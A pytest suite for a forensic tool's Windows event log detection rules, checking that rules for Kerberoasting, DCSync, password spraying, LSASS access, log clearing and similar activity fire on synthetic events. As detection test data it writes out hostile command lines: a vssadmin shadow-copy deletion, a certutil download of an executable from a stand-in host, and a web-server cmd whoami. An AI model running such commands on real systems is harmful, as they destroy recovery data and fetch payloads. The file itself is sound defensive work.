from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from investigation.core.models import Event, Severity
from investigation.core.requirements import Context
from investigation.core.store import EventStore
from investigation.modules.detections.builtin import BuiltinRules, load_rules
from investigation.modules.parsers.evtx import EvtxParser
from investigation.modules.sources.directory import DirectoryEvidence

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures" / "evtx"
T0 = datetime(2024, 5, 1, 12, 0, 0, tzinfo=timezone.utc)
SYSMON = "Microsoft-Windows-Sysmon/Operational"


@pytest.fixture(autouse=True)
def isolated_home(monkeypatch, tmp_path):
    monkeypatch.setenv("INVESTIGATION_HOME", str(tmp_path / "home"))


def ev(seconds=0, **fields):
    fields.setdefault("Channel", "Security")
    return Event(
        timestamp=T0 + timedelta(seconds=seconds), timestamp_desc="Event Logged", artifact="evtx",
        source_file="synthetic.evtx", message=f"{fields.get('EventID')}", fields=fields,
    )


def run(tmp_path, events):
    store = EventStore(tmp_path / "db.sqlite")
    store.add_many(events)
    return list(BuiltinRules().detect(store, Context()))


def ids(findings):
    return sorted(f.rule_id for f in findings)


@pytest.fixture(scope="module")
def fixture_findings(tmp_path_factory):
    import os

    os.environ["INVESTIGATION_HOME"] = str(tmp_path_factory.mktemp("home"))
    tmp = tmp_path_factory.mktemp("rules")
    store = EventStore(tmp / "db.sqlite")
    store.add_many(EvtxParser().parse(DirectoryEvidence(FIXTURES), Context(), lambda m, s: None))
    findings = list(BuiltinRules().detect(store, Context()))
    del os.environ["INVESTIGATION_HOME"]
    return {f.rule_id: f for f in findings}


def test_log_cleared_rules(fixture_findings):
    assert "INV-EVTX-001" in fixture_findings
    assert "INV-EVTX-002" in fixture_findings
    assert fixture_findings["INV-EVTX-001"].severity is Severity.HIGH


def test_service_rules(fixture_findings):
    assert "INV-EVTX-003" in fixture_findings
    f = fixture_findings["INV-EVTX-004"]
    assert f.severity is Severity.HIGH
    assert "T1543.003" in f.mitre
    assert any(e.fields.get("ServiceName") == "spoolfool" for e in f.events)
    assert "INV-EVTX-005" not in fixture_findings


def test_comsvcs_fixture(fixture_findings):
    assert "INV-EVTX-029a" in fixture_findings
    assert "INV-EVTX-032a" in fixture_findings
    assert "INV-EVTX-028" not in fixture_findings


def test_no_false_positive_on_4624_type2(fixture_findings):
    assert "INV-EVTX-007" not in fixture_findings
    assert "INV-EVTX-013" not in fixture_findings


def test_threshold_window(tmp_path):
    ten_fast = [ev(i * 33, EventID=4625, IpAddress="10.0.0.5", TargetUserName="bob") for i in range(10)]
    assert ids(run(tmp_path / "a", ten_fast)).count("INV-EVTX-008") == 1
    ten_slow = [ev(i * 34, EventID=4625, IpAddress="10.0.0.5", TargetUserName="bob") for i in range(10)]
    assert "INV-EVTX-008" not in ids(run(tmp_path / "b", ten_slow))
    two_ips = ten_fast + [ev(i * 10, EventID=4625, IpAddress="10.0.0.9", TargetUserName="bob") for i in range(10)]
    assert ids(run(tmp_path / "c", two_ips)).count("INV-EVTX-008") == 2
    dashes = [ev(i, EventID=4625, IpAddress="-", TargetUserName="bob") for i in range(20)]
    assert "INV-EVTX-008" not in ids(run(tmp_path / "d", dashes))


def _vss(e, seconds=0):
    from dataclasses import replace
    return replace(e, source_file="vss:3:x.evtx", tags=e.tags + ("vss",),
                   timestamp=e.timestamp + timedelta(seconds=seconds))


def test_vss_twins_not_double_counted(tmp_path):
    live = [ev(i, EventID=4625, IpAddress="10.0.0.5", TargetUserName="bob") for i in range(6)]
    assert "INV-EVTX-008" not in ids(run(tmp_path / "a", live + [_vss(e) for e in live]))
    only = [_vss(e, 100) for e in live]
    assert "INV-EVTX-008" in ids(run(tmp_path / "b", live + only))


@pytest.fixture(autouse=True)
def _mkdirs(tmp_path):
    for d in "abcdefgh":
        (tmp_path / d).mkdir()


def test_spraying_distinct(tmp_path):
    spray = [ev(i, EventID=4625, IpAddress="1.2.3.4", TargetUserName=f"user{i}") for i in range(5)]
    assert "INV-EVTX-009" in ids(run(tmp_path / "a", spray))
    same = [ev(i, EventID=4625, IpAddress="1.2.3.4", TargetUserName="bob") for i in range(5)]
    assert "INV-EVTX-009" not in ids(run(tmp_path / "b", same))


def test_success_after_failures_sequence(tmp_path):
    fails = [ev(i, EventID=4625, IpAddress="1.2.3.4", TargetUserName="bob") for i in range(5)]
    found = run(tmp_path / "a", fails + [ev(60, EventID=4624, IpAddress="1.2.3.4", TargetUserName="bob", LogonType=3)])
    f = [x for x in found if x.rule_id == "INV-EVTX-010"]
    assert len(f) == 1 and f[0].severity is Severity.CRITICAL
    assert len(f[0].events) == 6
    other_ip = fails + [ev(60, EventID=4624, IpAddress="9.9.9.9", LogonType=3)]
    assert "INV-EVTX-010" not in ids(run(tmp_path / "b", other_ip))
    before = [ev(-60, EventID=4624, IpAddress="1.2.3.4", LogonType=3)] + fails
    assert "INV-EVTX-010" not in ids(run(tmp_path / "c", before))


def test_substatus_and_lockout(tmp_path):
    found = ids(run(tmp_path / "a", [
        ev(0, EventID=4625, IpAddress="-", SubStatus="0xC0000064"),
        ev(1, EventID=4740, TargetUserName="bob"),
    ]))
    assert "INV-EVTX-011" in found and "INV-EVTX-012" in found


def test_pass_the_hash_seclogo(tmp_path):
    found = ids(run(tmp_path / "a", [ev(0, EventID=4624, LogonType=9, LogonProcessName="seclogo ")]))
    assert "INV-EVTX-013" in found


def test_kerberoasting(tmp_path):
    rc4 = [ev(i * 10, EventID=4769, TargetUserName="eve@CORP", ServiceName=f"svc{i}", TicketEncryptionType="0x17")
           for i in range(5)]
    assert "INV-EVTX-015" in ids(run(tmp_path / "a", rc4))
    aes = [ev(i * 10, EventID=4769, TargetUserName="eve@CORP", ServiceName=f"svc{i}", TicketEncryptionType="0x12")
           for i in range(5)]
    assert "INV-EVTX-015" not in ids(run(tmp_path / "b", aes))
    krbtgt = [ev(i, EventID=4769, TargetUserName="eve@CORP", ServiceName="krbtgt", TicketEncryptionType="0x17")
              for i in range(10)]
    assert "INV-EVTX-015" not in ids(run(tmp_path / "c", krbtgt))


def test_asrep_roasting(tmp_path):
    assert "INV-EVTX-016" in ids(run(tmp_path / "a", [ev(0, EventID=4768, PreAuthType="0")]))
    assert "INV-EVTX-016" not in ids(run(tmp_path / "b", [ev(0, EventID=4768, PreAuthType="2")]))


def test_dcsync_excludes_machine_accounts(tmp_path):
    props = "%%7688 {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}"
    assert "INV-EVTX-017" not in ids(run(tmp_path / "a", [ev(0, EventID=4662, Properties=props, SubjectUserName="DC01$")]))
    assert "INV-EVTX-017" in ids(run(tmp_path / "b", [ev(0, EventID=4662, Properties=props, SubjectUserName="jdoe")]))


def test_parent_child_rules(tmp_path):
    office = ev(0, EventID=1, Channel=SYSMON, ParentImage=r"C:\Program Files\Office\WINWORD.EXE",
                Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", CommandLine="powershell")
    assert "INV-EVTX-030a" in ids(run(tmp_path / "a", [office]))
    benign = ev(0, EventID=1, Channel=SYSMON, ParentImage=r"C:\Windows\explorer.exe",
                Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", CommandLine="powershell")
    assert not [i for i in ids(run(tmp_path / "b", [benign])) if i.startswith("INV-EVTX-03")]
    web = ev(0, EventID=1, Channel=SYSMON, ParentImage=r"c:\windows\system32\inetsrv\w3wp.exe",
             Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami")
    assert "INV-EVTX-031a" in ids(run(tmp_path / "c", [web]))
    web4688 = ev(0, EventID=4688, ParentProcessName=r"c:\windows\system32\inetsrv\w3wp.exe",
                 NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami")
    assert "INV-EVTX-031b" in ids(run(tmp_path / "d", [web4688]))


def test_ransomware_and_lolbins(tmp_path):
    found = ids(run(tmp_path / "a", [
        ev(0, EventID=1, Channel=SYSMON, Image=r"C:\Windows\System32\vssadmin.exe",
           CommandLine="vssadmin.exe Delete Shadows /All /Quiet", ParentImage=r"C:\x.exe"),
        ev(1, EventID=4688, NewProcessName=r"C:\Windows\System32\certutil.exe",
           CommandLine="certutil -urlcache -f http://x/a.exe a.exe", ParentProcessName=r"C:\cmd.exe"),
    ]))
    assert "INV-EVTX-034a" in found
    assert "INV-EVTX-033b" in found


def test_lsass_access(tmp_path):
    hit = ev(0, EventID=10, Channel=SYSMON, SourceImage=r"C:\tmp\x.exe",
             TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1FFFFF")
    assert "INV-EVTX-028" in ids(run(tmp_path / "a", [hit]))
    low = ev(0, EventID=10, Channel=SYSMON, SourceImage=r"C:\tmp\x.exe",
             TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1000")
    assert "INV-EVTX-028" not in ids(run(tmp_path / "b", [low]))


def test_rules_yaml_valid():
    rules = load_rules()
    rule_ids = [r.id for r in rules]
    assert len(rule_ids) == len(set(rule_ids))
    assert len(rules) >= 36
    for r in rules:
        assert isinstance(r.severity, Severity)
        assert r.mitre, r.id


def test_invalid_rule_key_rejected(tmp_path, monkeypatch):
    home = tmp_path / "h"
    (home / "rules").mkdir(parents=True)
    (home / "rules" / "bad.yaml").write_text(
        "- id: X-1\n  title: t\n  severity: low\n  mitre: [T1]\n  description: d\n  artifact: evtx\n"
        "  match: {EventID: 1}\n  bogus_key: 1\n"
    )
    monkeypatch.setenv("INVESTIGATION_HOME", str(home))
    with pytest.raises(ValueError, match="bogus_key"):
        load_rules()


def test_user_rules_dir_loaded(tmp_path, monkeypatch):
    home = tmp_path / "h"
    (home / "rules").mkdir(parents=True)
    (home / "rules" / "x.yaml").write_text(
        "- id: USER-1\n  title: custom\n  severity: info\n  mitre: [T1000]\n  description: d\n"
        "  artifact: evtx\n  match: {EventID: 9999}\n"
    )
    monkeypatch.setenv("INVESTIGATION_HOME", str(home))
    assert "USER-1" in ids(run(tmp_path / "a", [ev(0, EventID=9999)]))


PMEM_PATH = r"C:\Users\bob\AppData\Local\Temp\pme1A2B.tmp"


def test_log_cleared_only_for_security_channel(tmp_path):
    assert "INV-EVTX-001" in ids(run(tmp_path / "a", [ev(EventID=1102)]))
    other = [ev(EventID=1102, Channel="Microsoft-Windows-WebAuthN/Operational"),
             ev(1, EventID=1102, Channel="Intel Graphics Software")]
    assert "INV-EVTX-001" not in ids(run(tmp_path / "b", other))


def test_explicit_credentials_ignores_machine_account_and_loopback(tmp_path):
    noisy = ev(EventID=4648, SubjectUserName="BEBEK$", TargetUserName="someone@live.com", IpAddress="127.0.0.1")
    assert "INV-EVTX-014" not in ids(run(tmp_path / "a", [noisy]))
    loopback6 = ev(EventID=4648, SubjectUserName="bob", IpAddress="::1")
    assert "INV-EVTX-014" not in ids(run(tmp_path / "b", [loopback6]))
    machine = ev(EventID=4648, SubjectUserName="BEBEK$", IpAddress="10.0.0.5")
    assert "INV-EVTX-014" not in ids(run(tmp_path / "c", [machine]))
    real = ev(EventID=4648, SubjectUserName="bob", IpAddress="10.0.0.5")
    assert "INV-EVTX-014" in ids(run(tmp_path / "d", [real]))


def test_new_service_is_low(tmp_path):
    f = run(tmp_path, [ev(EventID=7045, ServiceName="Foo", ImagePath=r"C:\Program Files\Foo\foo.exe")])
    rule = next(x for x in f if x.rule_id == "INV-EVTX-003")
    assert rule.severity is Severity.LOW and "routinely" in rule.note


def test_winpmem_service_has_its_own_info_rule(tmp_path):
    pmem = ev(EventID=7045, ServiceName="pmem", ImagePath=PMEM_PATH)
    found = run(tmp_path / "a", [pmem])
    assert ids(found) == ["INV-EVTX-004a"]
    assert found[0].severity is Severity.INFO and found[0].title == "Memory acquisition driver loaded (WinPmem)"
    assert found[0].mitre == ("T1003",)


def test_pmem_lookalikes_are_still_reported(tmp_path):
    wrong_name = ev(EventID=7045, ServiceName="pmem2", ImagePath=PMEM_PATH)
    wrong_path = ev(1, EventID=7045, ServiceName="pmem", ImagePath=r"C:\Users\bob\AppData\Local\Temp\evil.exe")
    got = ids(run(tmp_path, [wrong_name, wrong_path]))
    assert "INV-EVTX-003" in got and "INV-EVTX-004" in got and "INV-EVTX-004a" not in got


def test_non_correlated_finding_counts_vss_twin_once(tmp_path):
    live = ev(EventID=1102)
    found = run(tmp_path, [live, _vss(live)])
    f = next(x for x in found if x.rule_id == "INV-EVTX-001")
    assert len(f.events) == 1
